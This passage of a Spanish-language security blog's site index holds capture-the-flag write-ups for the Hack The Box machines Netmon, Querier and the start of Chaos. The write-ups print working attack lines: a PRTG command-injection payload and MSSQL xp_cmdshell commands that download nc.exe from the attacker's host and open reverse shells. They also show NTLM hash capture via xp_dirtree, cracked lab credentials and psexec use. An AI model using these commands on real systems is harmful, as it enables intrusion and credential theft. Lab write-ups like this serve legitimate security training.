http y puertos de windows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 root@sckull:~# nmap -sT -p- --min-rate 5000 10.10.10.152 -o tcp Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 18:59 GMT Warning: 10.10.10.152 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.152 Host is up (0.24s latency). Not shown: 32841 closed ports, 32683 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49673/tcp open unknown 50315/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 169.37 seconds root@sckull:~# nmap -sC -p 21,80,135,139,445 -o nmap-ports.scan 10.10.10.152 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 19:03 GMT Nmap scan report for 10.10.10.152 Host is up (0.16s latency). PORT STATE SERVICE 21/tcp open ftp | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub | 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs | 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files | 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) | 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users |_02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_clock-skew: mean: 48s, deviation: 0s, median: 47s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-03-06 19:03:57 |_ start_date: 2019-03-06 18:58:01 Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds FTP - Puerto 21 Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 root@sckull:~# ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls -lah 200 PORT command successful. 125 Data connection already open; Transfer starting. 11-20-16 09:46PM \u0026lt;DIR\u0026gt; $RECYCLE.BIN 02-02-19 11:18PM 1024 .rnd 11-20-16 08:59PM 389408 bootmgr 07-16-16 08:10AM 1 BOOTNXT 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents and Settings 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub 03-06-19 02:04PM 738197504 pagefile.sys 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) 02-25-19 09:56PM \u0026lt;DIR\u0026gt; ProgramData 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Recovery 02-03-19 07:04AM \u0026lt;DIR\u0026gt; System Volume Information 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd Users 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-25-19 10:44PM \u0026lt;DIR\u0026gt; Administrator 02-02-19 11:35PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; cd Public 250 CWD command successful. ftp\u0026gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Pictures 02-02-19 11:35PM 33 user.txt 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; bin 200 Type set to I. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 33 bytes received in 0.37 secs (0.0877 kB/s) ftp\u0026gt; root@sckull:~# cat user.txt dd58ce67b49e15105e88096c8d9255a5 ENUMERACION FTP Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado PRTG Network Monitor el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.\nHTTP - puerto 80 PRTG Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo \u0026lsquo;PRTG Configuration.dat\u0026rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo \u0026lsquo;PRTG Configuration.old\u0026rsquo;.\nreddit/prtg_gave_away_some_of_your_passwords\nSabiendo esto buscamos dentro de la maquina los archivos, por lo general se encuentran en el misma direccion que el programa (../Program Files/PRTG Network Monitor/PRTG configuration.dat) pero, al parecer el administrador cambio la direccion. Para enumerar archivos de manera rapida utilizamos Filezilla.\nLos archivos los pudimos encontrar en /Users/All Users/Paessler/PRTG Network Monitor.\nHicimos una busqueda de contraseñas dentro de los archivos y en PRTG Configuration.old.bak encontramos una contraseña para el usuario prtgadmin.\n1 2 3 4 \u0026lt;dbpassword\u0026gt; \u0026lt;!-- User: prtgadmin --\u0026gt; PrTg@dmin2018 \u0026lt;/dbpassword\u0026gt; Al intentar logearnos con las credenciales (prtgadmin:PrTg@dmin2018) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (PrTg@admin2018) al actual \u0026ndash;\u0026gt; PrTg@dmin2018\nPRTG Command Injection Tenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.\nPRTG \u0026lt; 18.2.39 Command Injection Vulnerability\nNos dirigimos a Setup \u0026gt; Account Settings \u0026gt; Notifications\nCreamos una nueva notificacion y marcamos la opcion de EXECUTE PROGRAM, dentro de los parametros escribimos lo siguiente:\n1 C:\\netcat.txt;powershell -c \u0026#34;wget http://10.10.12.122/nc.exe -OutFile C:\\nc.exe; C:\\nc.exe 10.10.12.122 7878 -e cmd\u0026#34; ADMINISTRATOR - USER Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar nc.exe (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.\nObservamos por medio del servicio ftp que el archivo nc.exe se creó exitosamente en C:/nc.exe.\nY obtenemos una shell como administrador.\nY nuestra bandera de root.txt.\n","description":"Nos topamos con el puerto FTP con autenticacion minima, pudimos acceder a la archivos de configuracion de PRTG Network Monitor donde encontramos credenciales en archivo de configuracion. El software de monitoreo tiene una vulnerabilidad de Command Injection el cual aprovechamos para ejecutar una shell inversa y obtener privilegios de administrador.","id":201,"section":"posts","tags":["ftp","PRTG"],"title":"Hack The Box - Netmon","uri":"https://sckull.github.io/posts/netmon/"},{"content":"\rQuerier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.\nInformacion de la Maquina Nombre Querier OS Windows Puntos 30 Dificultad Media IP 10.10.10.125 Maker mrh4sh egre55 Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.7, 8.1, 5.7, 4.3, 1.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Masscan Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 masscan -p1-65535,U:1-65535 10.10.10.125 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-19 05:54:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49665/tcp on 10.10.10.125 Discovered open port 49666/tcp on 10.10.10.125 Discovered open port 49670/tcp on 10.10.10.125 Discovered open port 47001/tcp on 10.10.10.125 Discovered open port 135/tcp on 10.10.10.125 Discovered open port 49664/tcp on 10.10.10.125 Discovered open port 5985/tcp on 10.10.10.125 Discovered open port 49668/tcp on 10.10.10.125 Discovered open port 49671/tcp on 10.10.10.125 Discovered open port 139/tcp on 10.10.10.125 HTTP Al realizar una busqueda de archivos y directorios en el puerto 5985 no encontramos nada.\nSMBCLIENT Enumerando SHARENAMES con smbclient encontramos Reports e intentamos conectarnos.\n1 2 3 4 5 6 7 8 9 smbclient -L 10.10.10.125 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports Disk Dentro de Reports econtramos un archivo xlsm el cual no contiene nada\n1 2 3 smbclient \\\\\\\\10.10.10.125\\\\Reports \u0026#39;Currency Volume Report.xlsm\u0026#39; Binwalk Al utilizar BinWalk para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Rem Attribute VBA_ModuleType=VBADocumentModule Option VBASupport 1 \u0026#39; macro to pull data for client volume reports \u0026#39; \u0026#39; further testing required Private Sub Connect() Dim conn As ADODB.Connection Dim rs As ADODB.Recordset Set conn = New ADODB.Connection conn.ConnectionString = \u0026#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6\u0026#34; conn.ConnectionTimeout = 10 conn.Open If conn.State = adStateOpen Then \u0026#39; MsgBox \u0026#34;connection successful\u0026#34; \u0026#39;Set rs = conn.Execute(\u0026#34;SELECT * @@version;\u0026#34;) Set rs = conn.Execute(\u0026#34;SELECT * FROM volume;\u0026#34;) Sheets(1).Range(\u0026#34;A1\u0026#34;).CopyFromRecordset rs rs.Close End If End Sub Microsoft SQL Server Ya que tenemos credenciales para la base de datos procedemos a utilizar mssqlclient.py el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por \u0026ldquo;default\u0026rdquo; en Microsoft SQL Server.\nSQL Server Database 1 2 3 4 5 6 7 8 9 10 python mssqlclient.py -p 1433 -windows-auth -debug reporting:\u0026#39;PcwTWTHRwryjc$c6\u0026#39;@10.10.10.125 SQL\u0026gt; SELECT name FROM master.dbo.sysdatabases name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb volume MSSQL OOB Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario reporting. Pero el usuario si esta permitido para ejecutar xp_fileexist y xp_dirtree, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un servidor samba y con mssqlclient.py se ejecuto el comando para hacer una \u0026lsquo;consulta\u0026rsquo; hacia nuestra maquina y asi obtener las contraseñas.\n1 2 exec master..xp_fileexist \u0026#39;\\10.10.12.75\\pwn\u0026#39; -- - declare @q varchar(99);set @q=\u0026#39;\\\\10.10.14.23\\test\u0026#39;;exec master.dbo.xp_dirtree @q HTTP/1.1 Local 1 python smbserver.py -smb2support -port 445 -ip 10.10.12.220 Me /tmp/me Remote 1 EXEC MASTER.sys.xp_dirtree \u0026#39;\\\\10.10.12.220\\Me\u0026#39;, 1, 1 Capture MSSQL Credentials - SMBSERVER Hashcat Utilizamos hashcat para desencriptar.\n1 2 3 ./hashcat64.bin -m 5600 -o querier.txt ntlm.txt ../rockyou.txt mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000 Valor del hash.\n1 MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568 User - Flag 1 python mssqlclient.py -p 1433 -windows-auth -debug MSSQL-SVC:\u0026#39;corporate568\u0026#39;@10.10.10.125 Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar xp_cmdshell para ejecutar comando dentro de la computadora.\n1 EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; EXEC sp_configure reconfigure; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;EXEC sp_configure reconfigure; Ejecutando comandos, leyendo el flag user.txt.\n1 2 3 4 EXEC master.dbo.xp_cmdshell \u0026#39;more C:\\Users\\mssql-svc\\Desktop\\user.txt\u0026#39;; output -------------------------------------- c37b41bb669da345bb14de50faab3c16 Shell Utilizando powershell para descargar nc.exe (netcat) en la computadora.\n1 EXEC master.dbo.xp_cmdshell \u0026#39;powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/nc.exe -OutFile C:\\Users\\mssql-svc\\Desktop\\nc.exe }\u0026#34;\u0026#39;; Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local\n1 EXEC master.dbo.xp_cmdshell \u0026#39;C:\\Users\\mssql-svc\\Desktop\\nc.exe -e cmd 10.10.12.33 7878\u0026#39;; Local 1 nc -lvp 7878 Privesc Estando dentro de la maquina como MSSQL-SVC procedemos a hacer una enumeracion con PowerUp el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.\nPowerUp Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.\nPowerUp.ps1 1 2 powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\\Users\\mssql-svc\\Desktop\\power.ps1 }\u0026#34; Import-Module .\\power.ps1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 Invoke-AllChecks | Out-File -Encoding ASCII checks.txt [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... [*] Checking service executable and argument permissions... [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable DLL locations... ModifiablePath : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : QUERIER\\mssql-svc Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; [*] Checking for AlwaysInstallElevated registry key... [*] Checking for Autologon credentials in registry... [*] Checking for modifidable registry autoruns and configs... [*] Checking for modifiable schtask files/configs... [*] Checking for unattended install files... UnattendPath : C:\\Windows\\Panther\\Unattend.xml [*] Checking for encrypted web.config strings... [*] Checking for encrypted application pool and virtual directory passwords... [*] Checking for plaintext passwords in McAfee SiteList.xml files.... [*] Checking for cached Group Policy Preferences .xml files.... Changed : {2019-01-28 23:12:48} UserNames : {Administrator} NewName : [BLANK] Passwords : {MyUnclesAreMarioAndLuigi!!1!} File : C:\\ProgramData\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml Al finalizar Nos encontramos que existe un archivo de Groups Policy que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script psexec.py para conectarnos de manera remota con el Usuario Administrator y obtener una shell con nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 root@sckull:~/impacket/examples# python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies [+] StringBinding ncacn_np:10.10.10.125[\\pipe\\svcctl] [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [*] Requesting shares on 10.10.10.125..... [*] Found writable share ADMIN$ [*] Uploading file WsaCFcep.exe [*] Opening SVCManager on 10.10.10.125..... [*] Creating service EOzc on 10.10.10.125..... [*] Starting service EOzc..... [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [!] Press help for extra shell commands [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto Microsoft Windows [Version 10.0.17763.292] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd .. C:\\Windows\u0026gt;cd C:\\ C:\\\u0026gt;cd Users\\Administrator C:\\Users\\Administrator\u0026gt;cd Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is FE98-F373 Directory of C:\\Users\\Administrator\\Desktop 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; . 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; .. 01/28/2019 12:08 AM 33 root.txt 1 File(s) 33 bytes 2 Dir(s) 5,970,571,264 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;more root.txt b19c3794f786a1fdcf205f81497c3592 ","description":"Querier es una maquina de HackTheBox, descubrirmos credenciales en una coneccion de base de datos SQL Server dentro de los macros de Excel (xlsm) lo que nos dio acceso a la base de datos mediante un script de Impacket y que posteriormente nos permitio realizar Out-of-Band para obtener las credenciales, este ultimo nos permitio ejecutar una shell inversa. Tras ejecutar PowerUp encontramos credenciales las cuales utilizamos en PSexec para obtener privilegios de administrador.","id":202,"section":"posts","tags":["smbclient","binwalk","mssql","impacket","powershell","powerup","mssqlclient","out-of-band","SQL Server"],"title":"Hack The Box - Querier","uri":"https://sckull.github.io/posts/querier/"},{"content":"\rChaos expone WordPress donde desbloqueamos un post con informacion de WPScan, dicho post presenta credenciales que nos dieron acceso al puerto IMAP, encontramos un correo encriptado el cual nos guió a pdfTEXT (LaTex) donde explotamos un RCE y escapamos de una shell limitada. Contraseñas guardadas en el directorio Firefox nos permitió escalar privilegios.\nInformacion de la Maquina Nombre Chaos OS Linux Puntos 30 Dificultad Media IP 10.10.10.120 Maker felamos\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.6, 4.4, 4.1, 5.9, 5.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 8, 1, 9, 2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8 9 10 11 12 root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10.10.10.120 Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.120 Host is up (0.093s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd (Ubuntu) 993/tcp open ssl/imap Dovecot imapd (Ubuntu) 995/tcp open ssl/pop3 Dovecot pop3d 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.15 seconds HTTP Al visitar la pagina en el puerto 80 nos muestra un mensaje Direct IP not allowed.\nWFUZZ Escaneo de directorios con WFUZZ y el wordlist common.txt, nos encontramos con un directorio /wp.\n1 2 3 4 5 6 7 8 9 10 11 12 Target: http://10.10.10.120/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 1 L\t5 W\t73 Ch\t\u0026#34;\u0026#34; 001994: C=200 1 L\t5 W\t73 Ch\t\u0026#34;index.html\u0026#34; 002119: C=301 9 L\t28 W\t317 Ch\t\u0026#34;javascript\u0026#34; 003562: C=403 11 L\t32 W\t300 Ch\t\u0026#34;server-status\u0026#34; 004458: C=301 9 L\t28 W\t309 Ch\t\u0026#34;wp\u0026#34; Realizamos un escaneo por segunda vez al directorio /wp.\n1 2 3 4 5 6 7 8 9 Target: http://10.10.10.120/wp/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 16 L\t60 W\t933 Ch\t\u0026#34;\u0026#34; 004445: C=301 9 L\t28 W\t319 Ch\t\u0026#34;wordpress\u0026#34; /wp/wordpress Al visitar la ruta http://10.10.10.120/wp/wordpress/ nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.\nObtuvimos la contraseña por medio de la herramienta WPSCAN, la contraseña con la que pudimos desbloquear el post fue un usuario (human) que encontramos con WPSCAN.\nWPSCAN - Users Credenciales:\n1 2 username – ayush password – jiujitsu Las credenciales que nos muestran son las de webmail.\nHTTP - PUERTO 10000 Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo /etc/hosts con la IP de la maquina.\n1 2 # [/etc/hosts] 10.10.10.120\tchaos Al visitar https://chaos:10000/ nos muestra el weblogin al cual se refiere el mensaje de las credenciales.\nIgualmente podemos acceder direcatamente con la IP utilizando https.\nAl intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.\nIMAP - Puerto 993 Utilizamos openssl para poder conectarnos con el puerto 993 y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.\nEn la carpeta o seccion de Drafts encontramos un correo existente aun.\nAl leer el correo nos muestra un mensaje que nos habla sobre dos archivos adjuntos al correo.\n1 2 3 4 5 6 Hii, sahay Check the enmsg.txt You are the password XD. Also attached the script which i used to encrypt. Thanks, Ayush Primer archivo:\n1 MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08= Segundo archivo:\n1 ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBvdXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdldHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikKCiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVua3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgogICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5